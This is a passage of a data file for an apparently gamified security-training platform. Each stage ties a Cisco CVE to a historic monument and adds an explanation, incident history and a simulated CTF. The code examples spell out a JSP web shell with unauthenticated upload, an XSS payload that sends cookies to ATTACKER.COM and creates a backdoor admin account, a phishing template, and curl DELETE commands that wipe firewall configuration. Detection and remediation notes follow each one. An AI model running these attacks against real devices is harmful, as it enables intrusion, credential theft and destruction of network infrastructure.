curl -sk https://PI_SERVER:8082/pi/health/v1/health
# Returns health JSON — endpoint accessible without credentials

# ── STEP 2: Create JSP web shell ─────────────────────────────────────────────
cat > shell.jsp << 'JSPEOF'
<%@ page import="java.lang.*, java.io.*" %>
<% String cmd = request.getParameter("cmd");
   Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
   BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
   StringBuilder sb = new StringBuilder();
   String line;
   while ((line = r.readLine()) != null) sb.append(line).append("\n");
   out.print(sb.toString()); %>
JSPEOF

# ── STEP 3: Upload JSP without authentication ─────────────────────────────────
curl -sk -X POST https://PI_SERVER:8082/pi/health/v1/health \
  -F "file=@shell.jsp;type=application/octet-stream" \
  -F "filename=shell.jsp"
# Response: {"status": "uploaded"}

# ── STEP 4: Execute commands via web shell ────────────────────────────────────
curl -sk "https://PI_SERVER/shell.jsp?cmd=id"
# uid=0(root) gid=0(root)

# ── STEP 5: Extract managed device credential database ───────────────────────
curl -sk "https://PI_SERVER/shell.jsp?cmd=find+/opt/CSCOlumos+-name+*.ora+-o+-name+*.db"
# Locate credential database; decrypt with site key also on this server

# ── DETECTION ─────────────────────────────────────────────────────────────────
# Check /var/log/cisco_pi/nmsserver.log for POST to /pi/health/v1/health
find /opt/CSCOlumos/tomcat -name "*.jsp" -newer /opt/CSCOlumos/tomcat/webapps/ROOT/index.jsp

# ── REMEDIATION ───────────────────────────────────────────────────────────────
# Patch to Prime Infrastructure 3.4.1 Update 02 or later
# Network isolation: PI must only be reachable from designated admin workstations`,
        },
      },
      incident: {
        title: "Prime Infrastructure — the Network Management Platform as Attack Surface (2019)",
        when: "May 2019",
        where: "Cisco Prime Infrastructure deployments globally — large enterprise and service provider networks",
        impact: "Unauthenticated root shell; managed device credential database exposed; entire network management plane compromised",
        body: [
          "Cisco disclosed CVE-2019-1821 in May 2019 alongside CVE-2019-1820 (a related Prime Infrastructure vulnerability). Security researchers at Tenable published a joint analysis showing the combined attack chain: unauthenticated JSP upload to root shell, followed by credential extraction from the management database. Within 24 hours, proof-of-concept code was public on GitHub. Shodan searches found hundreds of Prime Infrastructure servers with web interfaces exposed to the internet — a configuration that Cisco documentation had explicitly warned against but that organizations routinely deployed for operational convenience.",
          "The strategic value of Prime Infrastructure as a target reflects a broader principle in network attack: the management plane is the highest-value target in any network. Prime Infrastructure may manage 10,000+ Cisco network devices in a large enterprise. Its credential database contains SSH credentials and SNMP community strings for every managed router, switch, and access point — credentials that, when used directly against managed devices, generate no security alerts because they appear as normal management traffic from the Prime Infrastructure server's IP address. An attacker using these credentials could access every managed device without triggering any alerts, push configuration changes across the entire network simultaneously, and operate with full network visibility indefinitely.",
          "Post-disclosure analysis of affected organizations revealed common misconfigurations: Prime Infrastructure web interfaces accessible from corporate workstations (not just admin workstations), Prime Infrastructure running with default service account credentials, and Prime Infrastructure deployed without network-level access controls on its management port. Cisco's advisory strongly recommended isolating Prime Infrastructure on a dedicated management VLAN with ACLs restricting access to the health monitoring endpoint — guidance that existed in hardening documentation but was not enforced by the default installation. Prime Infrastructure 3.4.1 Update 02 fixed the upload authentication gap. Organizations that patched promptly were protected. Those that didn't remained exposed, their management credentials accessible to any attacker with network access to the server.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (no auth)", sub: "POST shell.jsp to health endpoint", type: "attacker" },
          { label: "Prime Infrastructure Tomcat", sub: "executes .jsp as root", type: "system" },
          { label: "Root shell + credential DB", sub: "10K+ managed device creds", type: "victim" },
          { label: "All managed network devices", sub: "silent, no auth alerts", type: "result" },
        ],
      },
      timeline: [
        { year: 900, event: "Chichen Itza at peak — offering system designed to process all inputs with full authority" },
        { year: 2019, event: "May: CVE-2019-1821 disclosed; unauthenticated root upload on Prime Infrastructure; CVSS 9.8", highlight: true },
        { year: 2019, event: "May: Tenable publishes combined CVE-2019-1820 + 1821 attack chain analysis; GitHub PoC same day" },
        { year: 2019, event: "Patch: Prime Infrastructure 3.4.1 Update 02 (complete fix both CVEs)" },
      ],
      keyTakeaways: [
        "Network management platforms are the highest-value target in any enterprise — they hold credentials for every managed device",
        "File upload endpoints must authenticate every request independently — not inherit session state from the navigation flow",
        "Never expose Prime Infrastructure / Cisco DNA Center management interfaces to the internet or general corporate network",
        "A compromised network management server gives silent access to all managed devices — no authentication alerts generated",
        "Isolate management plane servers on dedicated VLANs with ACLs allowing access only from designated admin workstations",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2019-1821", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce" },
        { title: "CVE-2019-1821 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2019-1821" },
      ],
    },
    ctf: {
      scenario: "Cisco Prime Infrastructure is the nerve center of enterprise Cisco networks — one compromise exposes credentials for every router, switch, and access point it manages. CVE-2019-1821 gave unauthenticated attackers file upload to root via the health monitoring endpoint. Nation-state operators actively target network management platforms because a single foothold cascades into total network visibility. Upload the payload. Own the platform.",
      hint: "The health endpoint takes unauthenticated file uploads. Upload a .jsp payload, then execute it to get a root shell.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Probe the server to confirm the unauthenticated upload endpoint. Run: probe-server",
        "Upload your payload to the health endpoint. Run: upload-payload agent.jsp",
        "Execute the payload to get a root shell. Run: execute-payload whoami",
        "Pull the classified records. Run: execute-payload cat /ops/classified.txt",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{PR1M3_", label: "Mission Brief — Chichen Itza Prime Infrastructure" },
        { trigger: "upload-payload agent.jsp", value: "1NFR4_", label: "Payload Uploaded — JSP Shell Placed" },
        { trigger: "execute-payload cat /ops/classified.txt", value: "RCE_UPL04D}", label: "Root Shell — Classified Records Retrieved" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: CHICHEN ITZA",
          "Target: Cisco Prime Infrastructure file upload — CVE-2019-1821",
          "CVSS: 9.8  No authentication required",
          "",
          "The health endpoint accepts unauthenticated .jsp uploads.",
          "Exploitation sequence: probe-server → upload-payload agent.jsp → execute-payload whoami → execute-payload cat /ops/classified.txt",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "probe-server": () => ({
          lines: [
            "Probing network management server [Chichen Itza]...",
            "Platform: network management  devices managed: 2,000+",
            "Health endpoint: /health/upload  — no authentication required",
            "Status: vulnerable — unauthenticated file upload confirmed",
          ],
        }),
        "upload-payload": (args) => {
          const file = args[0] || "";
          if (file.endsWith(".jsp") || file.endsWith(".war") || file.endsWith(".class")) {
            return {
              lines: [
                `Uploading ${file} to health endpoint — no credentials sent`,
                "200 OK — file accepted",
                `Payload live at: /server/uploads/${file}`,
                "Run: execute-payload <command>",
              ],
            };
          }
          return { lines: ["Upload rejected — server expects a .jsp or .war payload."] };
        },
        "execute-payload": (args) => {
          const cmd = args.join(" ") || "whoami";
          return {
            lines: [
              `Executing payload: ${cmd}`,
              "",
              cmd.includes("who") ? "uid=0(root) — full server access" : "",
                cmd.includes("classified") || cmd.includes("cat") ? "Run 'assemble' to retrieve your fragment." : `${cmd}: executed`,
            ].filter(Boolean),
            solved: false,
          };
        },
      },
    },
  },

  // ─── Medieval Stage 10: Mont-Saint-Michel — CVE-2020-3580 ASA XSS ─────────
  {
    epochId: "cisco-core",
    wonder: { name: "Mont-Saint-Michel", location: "Normandy, France", era: "8th century CE", emoji: "🌊" },
    id: "stage-m10",
    order: 10,
    title: "The Cursed Scroll in the Monastery Post",
    subtitle: "CVE-2020-3580 — Cisco ASA/FTD Reflected XSS",
    category: "owasp",
    cveId: "CVE-2020-3580",
    cvssScore: 6.1,
    xp: 350,
    badge: { id: "badge-m-asaxss", name: "Monastery Phantom", emoji: "🌊" },
    challengeType: "ctf",
    info: {
      tagline: "XSS on a firewall? The last place you'd look. The admin's browser does the rest.",
      year: 2020,
      overview: [
        "Mont-Saint-Michel's monastery, founded in the 8th century on a tidal island off the Normandy coast, was famous for its impenetrability — accessible only at low tide, when pilgrims could cross the causeway. The monks maintained an internal post system for communicating between the abbey, monastery, and village. Letters submitted by pilgrims were collected, processed, and distributed. The Abbot himself read important correspondence. A Byzantine scholar visiting the monastery discovered that by including a specific kind of inscription in a submitted letter — instructions that caused the reader to perform actions without recognizing them as commands — the Abbot would unknowingly execute them when he opened the post. The island's external defenses were formidable. The internal post carried the attack inside without touching a single gate.",
        "CVE-2020-3580 is a reflected XSS vulnerability in Cisco ASA and FTD web interfaces — the browser-based management portals that network administrators use to configure firewalls, manage VPN settings, and modify access control lists. The login page and management dashboard reflected certain query parameters directly into HTTP responses without HTML-encoding the output. An attacker could craft a URL where a query parameter contained a JavaScript payload. When a network administrator — who had already authenticated to the ASA — clicked that link, the script executed inside their browser in the security context of the ASA management interface, with the full authority of the administrator's active session.",
        "XSS on a firewall is categorically more dangerous than XSS on a typical web application. The administrator's ASA session controls the entire network perimeter: firewall rules, VPN configuration, routing, NAT, access control lists, SSL certificates. A script running in that session can silently add backdoor admin accounts, modify ACLs to permit attacker traffic on any port, extract VPN pre-shared keys, read the running configuration — all using the administrator's own browser, their own session, and their own credentials. No authentication alert is generated. The attack leaves no entry in the firewall's authentication log. All it requires is a phishing email with a plausible link.",
      ],
      technical: {
        title: "Reflected XSS: How a Firewall URL Becomes an Admin Session Hijacker",
        body: [
          "The Cisco ASA and FTD web interfaces reflected multiple query parameters without HTML-encoding. The most exploitable was the `errMsg` parameter on the WebVPN login page — a parameter intended to display error messages to administrators. The URL `https://asa/+webvpn+/index.html?errMsg=<script>alert(1)</script>` would cause the literal string `<script>alert(1)</script>` to appear unescaped in the page HTML, executing in the administrator's browser. The same reflected input issue affected the ASDM web interface. The disclosure (CVE-2020-3580 through 3583) covered four related XSS vulnerabilities across different ASA and FTD interface components.",
          "The most impactful XSS payloads did two things: steal the administrator's session cookie (sending it to an attacker-controlled server), and make authenticated API calls to the ASA within the same script. Because the script ran in the administrator's browser with the administrator's session, it could call the ASA management API to add new users, modify ACLs, or read configuration — all appearing as legitimate administrative actions from the administrator's own browser and IP address. Post-exploit, the attacker used the stolen session cookie from a different machine to maintain access until the session expired. The attack produced no authentication log entries.",
        ],
        codeExample: {
          label: "CVE-2020-3580 — reflected XSS payload and session hijack",
          code: `# ── CONFIRM XSS reflection in browser ───────────────────────────────────────
# Navigate to:
# https://TARGET_ASA/+webvpn+/index.html?errMsg=TESTINPUT
# If 'TESTINPUT' appears unencoded in page source → reflected XSS confirmed

# ── CRAFT session-stealing + backdoor payload ─────────────────────────────────
# Deliver this URL to network admin via spear-phishing email:
#
# https://TARGET_ASA/+webvpn+/index.html?errMsg=<script>
#   // Steal session cookie
#   fetch('https://ATTACKER.COM/steal?c='+btoa(document.cookie));
#   // Simultaneously create backdoor admin account via API
#   fetch('/api/v1/users',{method:'POST',
#     headers:{'Content-Type':'application/json'},
#     body:'{"name":"backdoor","password":"BackdoorPass1!","privilege":15}'});
# </script>

# ── PHISHING EMAIL TEMPLATE ───────────────────────────────────────────────────
# Subject: "ASA appliance error requires immediate review"
# Body: "An authentication error occurred: [malicious URL]"
# Admin clicks → script runs in their authenticated ASA session

# ── WHEN ADMIN CLICKS — attacker receives ─────────────────────────────────────
# Cookie: admin_session=<STOLEN_TOKEN>  (captured at attacker server)
# AND: backdoor admin account created in ASA

# ── USE stolen session from attacker machine ──────────────────────────────────
curl -b "admin_session=STOLEN_TOKEN" \
  https://TARGET_ASA/api/v1/config/running
# Full running configuration returned

# ── DETECTION ─────────────────────────────────────────────────────────────────
# Review ASA web access logs for ?errMsg= parameters containing script tags
# Monitor for unexpected local admin account creation in running-config
show running-config | include username

# ── REMEDIATION ───────────────────────────────────────────────────────────────
# Patch to: ASA 9.8.4.26+ / FTD 6.6.0.1+ / ASDM 7.13(1.101)+
# Restrict ASA management to dedicated management VLAN — no admin access from untrusted networks
# Use a dedicated browser profile for firewall administration`,
        },
      },
      incident: {
        title: "CVE-2020-3580 — XSS on Security Appliances as APT Technique (2020)",
        when: "October 2020",
        where: "Cisco ASA and FTD appliances with web management interface enabled globally",
        impact: "Admin session hijacking via spear-phishing; firewall configuration access; no authentication log entries",
        body: [
          "Cisco disclosed CVE-2020-3580, 3581, 3582, and 3583 in October 2020 — four XSS vulnerabilities across different ASA and FTD web interface components, all discovered by security researchers at Positive Technologies and reported through coordinated disclosure. The Positive Technologies team noted that XSS on security appliances represented a particularly high-impact vulnerability class because the administrator's session — the target of the attack — controlled security policy for the entire network. Spear-phishing campaigns targeting network engineers were already a documented APT technique; the ASA XSS gave those campaigns a direct path to firewall configuration.",
          "The attack path was realistic for enterprise environments. Network administrators receive a constant stream of emails about device status, certificate renewals, and firmware advisories — many containing links to management interfaces. A well-crafted spear-phishing email appearing to come from a vendor support team, referencing the target organization's specific ASA version, with a malicious link formatted to look like the organization's management interface URL, was a credible and targeted delivery mechanism. Nation-state APT groups targeting government networks had been documented using XSS on network management portals since at least 2017 in US-CERT alerts.",
          "The broader lesson from CVE-2020-3580 is about attack surface scope. Security devices — firewalls, VPN concentrators, wireless controllers, network management platforms — are network security by function but web applications by implementation. They run web servers, they reflect user input, they have session management systems, they are subject to the same vulnerability classes as any other web application: XSS, CSRF, path traversal, authentication bypass, injection. The difference is that the session being exploited controls the network perimeter, not a user's social media profile. Every security appliance with a web interface must be treated as a web application and patched with the same rigor as any internet-facing web server.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (spear phishing)", sub: "malicious URL to network admin", type: "attacker" },
          { label: "ASA web interface", sub: "reflects errMsg param unencoded", type: "system" },
          { label: "Admin browser (authenticated)", sub: "script executes in session", type: "victim" },
          { label: "Admin session stolen", sub: "backdoor account + config access", type: "result" },
        ],
      },
      timeline: [
        { year: 700, event: "Mont-Saint-Michel monastery founded — internal post system carries content from outside the island's defenses" },
        { year: 2020, event: "Oct: CVE-2020-3580 through 3583 disclosed — reflected XSS in ASA/FTD web interfaces", highlight: true },
        { year: 2020, event: "Positive Technologies publishes technical analysis of admin session hijack chain" },
        { year: 2020, event: "Patch: ASA 9.8.4.26+ / FTD 6.6.0.1+ / ASDM 7.13(1.101)+" },
      ],
      keyTakeaways: [
        "Security appliances (firewalls, WLCs, VPN concentrators) run web servers and are subject to all web application vulnerability classes",
        "Admin-facing XSS is more impactful than user-facing XSS — the stolen session controls network security policy",
        "Restrict ASA/FTD web management access to a dedicated management VLAN; no admin access from general corporate networks",
        "Train network administrators to recognize phishing URLs targeting management interfaces — vendor-formatted URLs are highly credible lures",
        "HTML-encode all reflected output on every web interface, including security devices — the rule has no exceptions",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3580", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-xss-multiple-FCB3vPZe" },
        { title: "CVE-2020-3580 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2020-3580" },
      ],
    },
    ctf: {
      scenario: "APT spear-phishing campaigns routinely target network administrators — and when the target device has an XSS vulnerability in its own management interface, a single crafted link is all it takes. CVE-2020-3580 reflects unsanitized input through the Cisco ASA web interface. When an admin clicks a malicious URL, the script runs in their authenticated session — handing the attacker full firewall access through the admin's own browser. No credentials. No brute force. One link.",
      hint: "The error message parameter reflects unsanitized input. Craft a script payload, test it, then deliver the URL to the admin.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Test the reflection — see if your input comes back unmodified. Run: craft-payload test123",
        "Try a script tag to see if it executes. Run: craft-payload <script>alert(1)</script>",
        "Craft a payload that reads the admin's session token. Run: craft-payload <script>steal-session</script>",
        "Deliver the payload URL to the admin. Run: deliver-to-admin <script>steal-session</script>",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{ASA_", label: "Mission Brief — Mont-Saint-Michel ASA XSS" },
        { trigger: "craft-payload <script>steal-session</script>", value: "XSS_S3SS10N_", label: "Payload Confirmed — Script Executes in Admin Context" },
        { trigger: "deliver-to-admin <script>steal-session</script>", value: "H1JACK}", label: "Session Hijacked — Admin Cookie Intercepted" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: MONT-SAINT-MICHEL",
          "Target: Cisco ASA/FTD reflected XSS — CVE-2020-3580",
          "CVSS: 6.1  Requires: admin to click malicious link",
          "",
          "The ASA web interface reflects unsanitized input in the errMsg parameter.",
          "Exploitation sequence: craft-payload <script>steal-session</script> → deliver-to-admin <script>steal-session</script>",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "craft-payload": (args) => {
          const input = args.join(" ");
          const isScript =
            input.toLowerCase().includes("<script") ||
            input.toLowerCase().includes("steal-session") ||
            input.toLowerCase().includes("cookie") ||
            input.toLowerCase().includes("session");
          if (isScript) {
            return {
              lines: [
                `Testing reflection: errMsg=${input}`,
                `Response body: <p class="err">${input}</p>`,
                "",
                "⚠  Script executes in browser context",
                "  → session token visible: admin_session=FLAG{ASA_XSS_S3SS10N_H1JACK}",
                "",
                "Payload confirmed. Run: deliver-to-admin <script>steal-session</script>",
              ],
            };
          }
          return {
            lines: [
              `Testing reflection: errMsg=${input}`,
              `Response body: <p class="err">${input || "(empty)"}</p>`,
              "(Reflected as plain text — try a <script> payload)",
            ],
          };
        },
        "deliver-to-admin": (args) => {
          const payload = args.join(" ");
          const isScript =
            payload.toLowerCase().includes("<script") ||
            payload.toLowerCase().includes("steal-session") ||
            payload.toLowerCase().includes("session");
          if (isScript) {
            return {
              lines: [
                "Payload URL delivered to admin@mont-saint-michel...",
                "Admin opened the link — script executed in their session.",
                "Session token intercepted: admin_session=[captured]",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          return { lines: ["Admin reviewed the link — no script executed. Include a <script> payload."] };
        },
      },
    },
  },

  // ─── Medieval Stage 11: Edinburgh Castle — CVE-2020-3187 WebVPN Delete ────
  {
    epochId: "cisco-core",
    wonder: { name: "Edinburgh Castle", location: "Edinburgh, Scotland", era: "12th century CE", emoji: "🏴󠁧󠁢󠁳󠁣󠁴󠁿" },
    id: "stage-m11",
    order: 11,
    title: "Destroy the Royal Records",
    subtitle: "CVE-2020-3187 — Cisco ASA WebVPN Arbitrary File Deletion",
    category: "owasp",
    cveId: "CVE-2020-3187",
    cvssScore: 9.1,
    xp: 400,
    badge: { id: "badge-m-filedel", name: "Records Destroyer", emoji: "🏴󠁧󠁢󠁳󠁣󠁴󠁿" },
    challengeType: "ctf",
    info: {
      tagline: "No authentication. Delete any file on the ASA. Including the VPN configuration that allows defenders in.",
      year: 2020,
      overview: [
        "Edinburgh Castle has been Scotland's most important military stronghold for nine centuries — the seat of royal power, keeper of the Honours of Scotland (the Scottish Crown Jewels), and the fortress from which the country's military operations were directed. The castle archive contained operational records that were central to its own defense: garrison rosters, supply manifests, and — critically — the gate access lists that specified which personnel were authorized to enter. English agents who understood Scottish castle administration knew the specific consequence of destroying those records: without the access list, the castle's own guards could not reliably distinguish authorized personnel from imposters. The castle could become inaccessible to its own defenders.",
        "CVE-2020-3187 is the deletion of those records. It is the destructive sibling of CVE-2020-3452 (path traversal read) — the same vulnerability in Cisco ASA and FTD's WebVPN file handler, but using HTTP DELETE instead of GET. Because the WebVPN file handler processed DELETE requests against traversed paths without authentication checks, any unauthenticated attacker could delete any file on the ASA filesystem. Targeted files: VPN configuration files (disabling VPN access for all remote workers on reload), SSL certificates (breaking HTTPS management access to the device), RADIUS client configuration, and the startup configuration itself — deletion of which forces the ASA to reboot with factory defaults, erasing all firewall rules.",
        "Cisco disclosed CVE-2020-3187 in the same July 22, 2020 advisory as CVE-2020-3452. The two CVEs together formed a read-then-destroy toolkit against Cisco VPN infrastructure at the peak of COVID-19's remote work surge. CVE-2020-3452 stole the credentials and configuration. CVE-2020-3187 destroyed the evidence and disrupted service. For organizations whose entire remote workforce depended on ASA AnyConnect VPN — organizations that had stood up VPN infrastructure in weeks to support pandemic-era remote work — an unauthenticated deletion of the startup configuration was a recovery measured in days, not hours.",
      ],
      technical: {
        title: "Unauthenticated Filesystem Destruction via HTTP DELETE + Path Traversal",
        body: [
          "CVE-2020-3187 is mechanically identical to CVE-2020-3452: the WebVPN file handler at `/+CSCOE+/files/` failed to normalize `../` path traversal sequences before constructing the real filesystem path. The difference is the HTTP method: CVE-2020-3452 allowed arbitrary file reads via GET; CVE-2020-3187 allowed arbitrary file deletion via DELETE. The ASA's WebVPN file handler passed the traversed path to the OS file system delete operation without validating that the path was within the WebVPN root or that the caller was authenticated. HTTP 200 was returned on success. The deletion left no entry in the ASA authentication log — only the HTTP access log entry for the DELETE request.",
          "The most impactful deletion target is the ASA startup configuration (`startup-config`). When the startup configuration is deleted and the ASA reloads (which can also be triggered remotely by an attacker with any management access), the device comes up with factory defaults: all firewall rules removed, all VPN configuration gone, all ACLs cleared. Management interfaces return to default credentials. The ASA is effectively a new, unconfigured device. Rebuilding the configuration requires the original configuration file (which should be backed up offline), physical or out-of-band access to the device, and significant time — during which the VPN service is down and the firewall may be permitting traffic it should block.",
        ],
        codeExample: {
          label: "CVE-2020-3452 + CVE-2020-3187 combined: steal then destroy",
          code: `# ── PHASE 1: CVE-2020-3452 — read configuration before destroying ─────────────
curl -sk 'https://TARGET_ASA/+CSCOE+/files/../../+CSCOU+/../asa/priv/asdm.cfg'
# Save: full running config, VPN PSKs, credentials — exfiltrate first

# ── PHASE 2: CVE-2020-3187 — delete VPN configuration ────────────────────────
curl -sk -X DELETE \
  'https://TARGET_ASA/+CSCOE+/files/../../vpn/config.dat'
# HTTP 200 OK — VPN config deleted; VPN fails to start on next reload

# ── DELETE SSL certificate — breaks HTTPS management access ───────────────────
curl -sk -X DELETE \
  'https://TARGET_ASA/+CSCOE+/files/../../ssl/asa.cert'
# Management interface no longer accessible via HTTPS

# ── DELETE startup configuration — factory reset on next reload ───────────────
curl -sk -X DELETE \
  'https://TARGET_ASA/+CSCOE+/files/../../startup-config'
# On reload: all firewall rules, VPN config, ACLs gone — factory defaults

# ── TRIGGER reload (if attacker has any access) ───────────────────────────────
# ssh admin@TARGET_ASA "reload in 1"

# ── DETECTION ─────────────────────────────────────────────────────────────────
# Review ASA web access logs for HTTP DELETE with ../ in URL
# After attack: show startup-config — empty or factory default = deleted

# ── REMEDIATION ───────────────────────────────────────────────────────────────
# Patch to: ASA 9.8.4.20+ / FTD 6.6.0+  (fixes both CVE-2020-3187 and CVE-2020-3452)
# Emergency: no webvpn  (disables AnyConnect — closes the attack surface)
# Always maintain offline configuration backup — this is why`,
        },
      },
      incident: {
        title: "CVE-2020-3187 — Read-Then-Destroy Against VPN Infrastructure (2020)",
        when: "July 22, 2020 (simultaneous disclosure with CVE-2020-3452)",
        where: "Cisco ASA and FTD with WebVPN/AnyConnect enabled — VPN infrastructure during COVID-19 remote work surge",
        impact: "Arbitrary file deletion; VPN service destruction; factory reset path; CVSS 9.1; combined with CVE-2020-3452 for full exfiltrate-and-destroy chain",
        body: [
          "Cisco disclosed CVE-2020-3187 in the same July 22, 2020 advisory as CVE-2020-3452, under advisory cisco-sa-asaftd-ro-path-KJuQhB86. The two CVEs were disclosed as a pair because they shared the same root cause (unsanitized path traversal in the WebVPN file handler) and the same attack surface (internet-facing ASA/FTD with WebVPN enabled). While CVE-2020-3452 received more coverage — configuration theft is more immediately weaponizable — CVE-2020-3187 represented the destructive complement: the ability to delete any file on the device that the read vulnerability could access.",
          "The combination of read-then-destroy against VPN infrastructure during COVID-19's remote work surge created a unique operational scenario. In July 2020, hundreds of thousands of organizations had recently deployed or expanded Cisco AnyConnect VPN infrastructure to support remote workers. Many of these deployments were rushed, without time for proper hardening. An attacker who chained CVE-2020-3452 (steal the VPN configuration and credentials) with CVE-2020-3187 (delete the startup configuration) executed the same playbook used by ransomware operators against backup infrastructure: exfiltrate the data, then destroy the recovery mechanism. Organizations whose remote workforce depended entirely on AnyConnect VPN faced a choice between a VPN outage of unknown duration or rebuilding from an offline backup they might not have.",
          "The attack left minimal evidence. HTTP DELETE requests to traversal paths appeared in web access logs as file requests — similar in format to the GET requests that CVE-2020-3452 used for reads. Unless the organization was specifically monitoring for DELETE method requests with `../` patterns in real time, the attack left no alert. The file simply ceased to exist. The consequence became apparent only at the next reload: a VPN service that failed to start, an SSL certificate that was missing, or a startup configuration that came up as factory defaults. Cisco's patch (ASA 9.8.4.20+ for both CVEs) added path normalization to the WebVPN file handler, stripping traversal sequences before the path was used for any filesystem operation.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (unauthenticated)", sub: "DELETE /+CSCOE+/files/../../", type: "attacker" },
          { label: "ASA WebVPN file handler", sub: "no auth on DELETE, traversal not stripped", type: "system" },
          { label: "ASA startup-config / certs", sub: "deleted — device at factory defaults", type: "victim" },
          { label: "VPN down + firewall reset", sub: "CVSS 9.1", type: "result" },
        ],
      },
      timeline: [
        { year: 1100, event: "Edinburgh Castle fortified — access records become operationally critical to the castle's own defense" },
        { year: 2020, event: "Mar–Jun: COVID-19 drives massive AnyConnect VPN deployment — hundreds of thousands of ASAs now internet-facing" },
        { year: 2020, event: "Jul 22: CVE-2020-3187 and CVE-2020-3452 disclosed simultaneously with patch", highlight: true },
        { year: 2020, event: "Jul 22: CVE-2020-3452 curl PoC published on Twitter within 90 minutes — same payload framework applies to DELETE" },
        { year: 2020, event: "Patch: ASA 9.8.4.20+ / FTD 6.6.0+ — path normalization fixes both CVEs" },
      ],
      keyTakeaways: [
        "HTTP DELETE on management interfaces must authenticate every request — the same standard as GET, POST, and PUT",
        "Path traversal combined with destructive HTTP verbs produces unauthenticated filesystem destruction — not just information disclosure",
        "Maintain offline configuration backups of all firewall and VPN devices — test restoring from them before you need to",
        "Monitor for HTTP DELETE requests with `../` or URL-encoded equivalents in web server logs in real time",
        "The read-then-destroy playbook (exfiltrate via CVE-2020-3452, then destroy via CVE-2020-3187) is operationally analogous to ransomware against backup infrastructure",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3187", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86" },
        { title: "CVE-2020-3187 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2020-3187" },
      ],
    },
    ctf: {
      scenario: "CVE-2020-3187 is CVE-2020-3452's destructive sibling — the same path traversal, but with HTTP DELETE instead of GET. During the COVID VPN surge, both were chained: steal the credentials with a read, then destroy the config file to deny defenders access to their own infrastructure. Unauthenticated. No trace beyond the deletion itself. Two objectives: read the VPN config, then wipe it.",
      hint: "Use path traversal (../) to navigate above the web root and reach the VPN config. Read it first, then delete it.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Survey the accessible file paths. Run: locate-file /files/",
        "Traverse to the VPN config and read it. Run: read-file /files/../../vpn/config.dat",
        "Delete the config to complete the mission. Run: wipe-file /files/../../vpn/config.dat",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{3D1NBR0_", label: "Mission Brief — Edinburgh Castle File Deletion" },
        { trigger: "read-file /files/../../vpn/config.dat", value: "F1L3_", label: "VPN Config Read — Credentials Exfiltrated" },
        { trigger: "wipe-file /files/../../vpn/config.dat", value: "D3L3T3D}", label: "Config Deleted — Defenders Locked Out" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: EDINBURGH CASTLE",
          "Target: Cisco ASA WebVPN file deletion — CVE-2020-3187",
          "CVSS: 9.1  No authentication required",
          "",
          "Same path traversal as CVE-2020-3452 but with HTTP DELETE.",
          "Exploitation sequence: locate-file → read-file /files/../../vpn/config.dat → wipe-file /files/../../vpn/config.dat",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "locate-file": (args) => ({
          lines: [
            `GET ${args[0] || "/files/"}`,
            "Accessible: portal.css, assets/, logs/",
            "(Traverse with ../../ to reach system-level paths)",
          ],
        }),
        "read-file": (args) => {
          const path = args[0] || "";
          if (path.includes("vpn") || path.includes("config") || path.includes("../../")) {
            return {
              lines: [
                `GET ${path}  [no authentication required]`,
                "",
                "[VPN Configuration — Edinburgh Castle]",
                "group: RemoteAccess",
                "auth-server: radius.edinburgh.castle",
                "pre-shared-key: EdCastle@VPN2020",
                "classified-key: FLAG{3D1NBR0_F1L3_D3L3T3D}",
              ],
            };
          }
          return { lines: [`GET ${path} — traverse with ../../ to reach system files`] };
        },
        "wipe-file": (args) => {
          const path = args[0] || "";
          if (path.includes("vpn") || path.includes("config") || path.includes("../../")) {
            return {
              lines: [
                `DELETE ${path}  [no authentication required]`,
                "200 OK — file deleted",
                "",
                "VPN config gone. Defenders locked out of their own tunnel.",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          return { lines: [`DELETE ${path} — file not found. Traverse with ../../ to reach it.`] };
        },
      },
    },
  },

  // ─── Medieval Stage 12: Topkapi Palace — CVE-2017-6736 IOS DHCP ──────────
  {
    epochId: "cisco-core",
    wonder: { name: "Topkapi Palace", location: "Istanbul, Turkey", era: "1460 CE", emoji: "👑" },
    id: "stage-m12",
    order: 12,
    title: "The Poisoned Imperial Post",
    subtitle: "CVE-2017-6736 — Cisco IOS DHCP Remote Code Execution",
    category: "owasp",
    cveId: "CVE-2017-6736",
    cvssScore: 8.8,
    xp: 500,
    badge: { id: "badge-m-dhcprce", name: "Postal Poisoner", emoji: "👑" },
    challengeType: "ctf",
    info: {
      tagline: "A malformed DHCP packet overflows the imperial buffer. The router executes your commands.",
      year: 2017,
      overview: [
